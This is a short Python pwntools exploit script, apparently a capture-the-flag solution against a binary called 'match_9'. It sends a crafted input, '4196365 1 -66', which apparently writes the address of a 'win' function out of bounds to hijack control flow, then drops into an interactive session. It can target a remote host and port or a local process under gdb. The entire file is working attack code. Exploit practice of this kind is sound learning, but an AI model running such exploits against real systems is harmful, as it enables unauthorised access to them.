#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True
#gdb_bool = False

def exploit(r):
    win = 0x40080C
    exit_addr = 0x6012F0
    result_addr = 0x601260
    r.recvn(0x18)
    buf = "4196365 1 -66"
    r.sendline(buf)
    r.recvn(0x9)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./match_9"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x4008C4",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

